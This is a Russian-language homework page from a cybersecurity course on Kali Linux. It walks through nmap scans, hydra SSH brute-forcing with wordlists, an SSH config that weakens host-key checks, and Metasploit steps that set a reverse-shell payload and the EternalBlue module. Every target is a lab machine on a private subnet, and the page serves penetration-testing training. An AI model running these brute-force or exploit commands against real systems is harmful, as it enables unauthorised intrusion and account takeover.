# Cyb07-onl

## 3. Kali Linux

### Дата и время занятия
Вторник, 16 Сентябрь, 19:00-22:00

### Описание занятия
- Что такое Kali, чем отличается от других дистрибутивов и почему так популярен
- Overview ОС, обновления, базовая настройка
- Самые ходовые приложения (Metasploit, Netcat, Burp, Aircrack-ng)
- Самые главные команды Bash
- Тренировка использования терминала

### Домашние задания

#### 1. Изучить список программ, для каждой рассмотренной категории программ Kali Linux
#### 2. Загрузить и установить вирутальную машину Metasploitable2
 - URL для скачивания https://sourceforge.net/projects/metasploitable/files/Metasploitable2/
 - гайд по развёртыванию машины https://medium.com/cyber-collective/setting-up-metasploitable-in-virtualbox-on-kali-linux-1d5c3212f7f3
#### 3. Объединить Kali Linux, Metasploitable и Ubuntu в одну подсеть

- Результат см. на screen1

#### 4. Выполнить сканирование BM Ubuntu и Metasploitable с использованием утилиты nmap 3 разными способами (скрины результатов запуска сканирования поместить в файл).

##### Способ 0: Быстрое сканирование сети без сканирования портов (Ping scan)
→ Просто проверяет, какие хосты в сети "живые" (доступны),   
Команда:  nmap -sn 192.168.1.0/24

По умолчанию nmap -sn использует комбинацию методов для обнаружения хостов:
- ICMP Echo Request (как ping)
- TCP SYN на порт 443
- TCP ACK на порт 80
- ICMP Timestamp Request
Это позволяет обнаружить хосты, даже если они блокируют обычный ping (ICMP).

Важно: Многие серверы, фаерволы и защитные системы намеренно блокируют ICMP-запросы (ping) и TCP-пакеты для обнаружения, чтобы защититься от сканирования.
По умолчанию, если nmap не определят хост как доступный, то пропускает сканирование портов!
Что бы этого избежать нужно использовать параметр -Pn который означает: "Treat all hosts as online" — считать все хосты "живыми", пропустить этап обнаружения (ping-сканирования). 

##### Способ 1: Быстрое сканирование открытых портов (TCP SYN scan)
→ Самый быстрый способ. Используется по умолчанию.    
Команда:  nmap -Pn -sS -T4 -p- 192.168.1.100 -vv    
Пояснение:    
  -Pn — считать все хосты "живыми" и пропустить этап обнаружения (ping-сканирования)
  -sS — SYN-сканирование (не завершает TCP-соединение → stealth-режим, меньше шума в сети)    
  -T4 — скорость сканирования (от 0 до 5; 4 — быстро, но не агрессивно)    
  -p- — сканировать все 65535 портов (можно указать диапазон: -p 1-1000 или конкретные: -p 22,80,443)    
  192.168.1.100 — IP-адрес цели, в качестве цели можно указать подсеть  
  -vv — Включить подробный вывод  

##### Способ 2: Определение версий служб и ОС (Version + OS detection)
→ Подходит, когда нужно узнать не только порты, но и что за сервисы работают, и какая ОС на целевой машине.
Команда: 
  sudo nmap -Pn -sV -O -T4 -p 22,80,443,8080 192.168.1.100 -vv
Пояснение:
  -sV — определение версий служб (например, Apache 2.4.41, OpenSSH 8.2p1).
  -O — попытка определить операционную систему.
  -p 22,80,443,8080 — сканируем только эти порты (быстрее и точнее).
  sudo — обязательно для -O и некоторых других типов сканирования.

##### Способ 3: Агрессивное сканирование с NSE-скриптами (NSE = Nmap Scripting Engine)
→ Максимально информативное сканирование: проверка уязвимостей, сбор информации, обход защиты.
Команда:
  sudo nmap -Pn -A -T4 -p- 192.168.1.100 -vv
или с конкретными скриптами:
  sudo nmap -Pn --script vuln -p 80,443 192.168.1.100 -vv
Пояснение:
  -A — агрессивный режим: включает:
    определение ОС (-O),
    определение версий (-sV),
    трассировку (traceroute),
    запуск скриптов NSE по умолчанию (например, http-title, ssl-cert, smb-os-discovery).
  --script vuln — запускает скрипты для поиска известных уязвимостей.
  --script "http-*" — все скрипты, связанные с HTTP.


#### 5. Выполнить брут паролей для ubuntu с использованием утилиты hydra (скрин результатов сканирования поместить в файл).
→ Hydra — один из самых известных инструментов для брутфорса (перебора логинов и паролей) по множеству протоколов, включая SSH

Распространённая ошибка в Hydra при брутфорсе SSH:
    ERROR could not connect to ssh - kex error : no match for method server host key algo: server [ssh-rsa,ssh-dss], client [ssh-ed25519,...]
    Это ошибка согласования алгоритмов SSH между клиентом (Hydra) и сервером, который поддерживает только старые/небезопасные алгоритмы ssh-rsa и ssh-dss
    А клиент (Hydra, использующий современную библиотеку libssh) их по умолчанию не предлагает — потому что они устарели и небезопасны (особенно ssh-dss).
Решение: Указать Hydra использовать старые алгоритмы через опцию ssh-key-types

Как проверить, какие алгоритмы поддерживает сервер?
Можно использовать nmap с NSE-скриптом ssh2-enum-algos который покажет, какие алгоритмы поддерживает сервер (ключей, шифрования, MAC и т.д.)
  nmap --script ssh2-enum-algos -p 22 192.168.1.103

Важно! Для версий Hydra 9+ параметр -I ssh-key-types=... больше не влияет на согласование host key algorithms
Решение: Настроить глобально SSH-клиент
Создать или открыть файл конфигурации ssh:
  nano ~/.ssh/config
Добавить следующий строки:
  Host 192.168.1.103
  HostKeyAlgorithms +ssh-rsa
  PubkeyAcceptedKeyTypes +ssh-rsa
  MACs hmac-sha1,hmac-md5
  KexAlgorithms +diffie-hellman-group1-sha1
  Ciphers +aes128-cbc,3des-cbc
  StrictHostKeyChecking no
  UserKnownHostsFile /dev/null

→ Теперь любой SSH-клиент (включая тот, что вызывает medusa или даже Hydra) будет использовать ssh-rsa.
💡 StrictHostKeyChecking и UserKnownHostsFile — чтобы не клиент не спрашивал про "известные хосты" при каждом подключении (удобно для брута). 

Команда:
  hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 6 -f -m "ssh-key-types=ssh-rsa,ssh-dss" ssh://192.168.1.103:22

  hydra 192.168.1.103 ssh -s 22 -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt -t 4 -V -f -I ssh-key-types=ssh-rsa

  hydra 192.168.1.103 ssh -s 22
  -L /usr/share/wordlists/metasploit/unix_users.txt \
  -P /usr/share/wordlists/rockyou.txt \
  -t 4 \
  -V \
  -f

Пояснения:
  192.168.1.103 — Целевой сервис
  ssh — Протокол
  -s — Порт для атаки (для SSH по умолчанию 22)
  -L — Файл со списком логинов (по одному на строку)
  -P — Файл со списком паролей (словарь)
  -t — Количество параллельных потоков (по умолчанию 16)
  -v/-V — Вывод процесса (Verbose) — V показывает попытки
  -o — Сохранить результат в файл
  -f — Остановить после первой успешной комбинации
  -I — Флаг для передачи аргументов модулю SSH в Hydra

Команда для распаковки словаря:
  sudo gunzip /usr/share/wordlists/rockyou.txt.gz


#### 6. Проэксплатировать как минимум 4 уязвимости ВМ Metasploitable (результаты эксплуатации поместить в файл).

1. Сканируем открытые порты атакуемой машины
2. Сканируем отдельные порты и сервисы в агрессивном режиме для поиска уязвимостей
3. Проверяем версии найденных сервисов по базе эксплойтов на наличие готовых эксплойтов

Поиск и использование экспойтов известных уязвимостей выполнятеся с применением утилиты Metasploit Framework (MSF)

Обновление базы модулей:
  msfupdate
Запуск утилиты: 
  msfconsole

Поиск эксплойтов (по названию, описанию, платформе, CVE, типу и другим параметрам)
Команда:
  search
Примеры:
🔎 Поиск по названию или описанию: search eternalblue

🖥️ Поиск по платформе (поиск эксплойтов для Linux): search type:exploit platform:linux

📌 Поиск по CVE: search CVE-2017-0144

🧱 Поиск по типу продукта (например, Apache, WordPress): search apache

Использование найденного эксплойта:
use 0
или
use exploit/windows/smb/ms17_010_eternalblue

Далее, запросить обязательные (Required: yes) и опциональные параметры:
show options

Далее, задать payload, если он не назначен по умолчанию
Показать доступные payload: show payloads
Установить выбранный payload: set payload cmd/unix/reverse_tcp

Далее, установть нужные параметры:
Реверс-хост
set LHOST 192.168.1.101
set LPORT 4444

Целевая машина
set RHOSTS 192.168.1.103
set RPORT 445

Далее, запуск эксплойта:
exploit
или для фонового режима:
run


Если выполнения заблокировано или конфликтует с текущими jobs или sessions
Просмотреть активные jobы :  jobs
Удалить jobу: jobs -k 0

Просмотреть активные сессии :  sessions
Удалить сессию: sessions -k 0


#### 7. На BM Kali используя CLI создать файл sh-скрипта last_name.sh, в который добавить команды:
  - создать папку с вашей фамилией
  - в папке создать текстовый файл infobez.txt
  - в созданный файл записать информацию “27.11.23 10.1.1.2 ip addr” через перенаправление вывода
  - с использованием команды cut вырезать из текстового файла только подстроку "10.1.1.2" и сохранить вырезанный адрес в новый файл ip.txt

#### 8. Выполнить скрипт командой “sh last_name.sh”, выполнить команду cat infobez.txt, выполнить команду cat ip.txt и сохранить скрины вывода терминала в файл.

#### Файл результатов сохранить в формате PDF и отправить на проверку.